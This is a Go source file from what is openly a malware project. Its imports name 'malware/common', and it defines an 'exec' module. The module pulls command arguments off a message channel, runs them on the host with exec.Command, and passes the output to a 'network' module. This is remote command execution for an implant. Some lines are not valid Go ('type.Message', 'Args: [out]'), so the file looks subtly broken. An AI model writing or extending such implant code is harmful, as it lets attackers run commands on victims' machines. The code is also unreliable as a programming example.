package sh

import (
	"fmt"
	"malware/common"
	"malware/common/types"
	"os/exec"
)

const CAPABILITY = "exec"

type state struct {
	running   bool
	rxChannel chan types.Message
	txChannel chan types.Message
}

type settings struct {
	// Could be another struct referencing a connection_type, encryption methods, etc
	state *state // Tell our loop to stop
}

func (settings settings) Capability() string {
	return CAPABILITY
}

// Create creates an implementation of settings
func Create() types.Module {
	state := state{running: false, rxChannel: nil, txChannel: nil}
	return settings{&state}
}

func (settings settings) runEvents() {
	for settings.state.running {
		message := <-settings.state.rxChannel

		switch message.Capability {
		case CAPABILITY:
			out, err := exec.Command(message.Args[0], message.Args[1:]...).Output()
			if err != nil {
				common.Panicf(err, "Error on running command: %s", message)
			}
			settings.state.txChannel <-type.Message{Capability: "network", Caller: settings.state.rxChannel, Args: [out]}
			fmt.Println(out)
		default:
			common.Panicf(nil, "Didn't receive RunCommand type, %s is type %T", message, message)
		}

	}

}

// Init the state of this module
func (settings settings) Init() types.Rx_Tx {
	settings.state.running = true
	settings.state.rxChannel = make(chan types.Message)
	settings.state.txChannel = make(chan types.Message)

	go settings.runEvents()

	return types.Rx_Tx{Rx: settings.state.rxChannel, Tx: settings.state.txChannel}
}

func (settings settings) Shutdown() {
	settings.state.running = false
}

func (settings) ID() string { return "adam" }
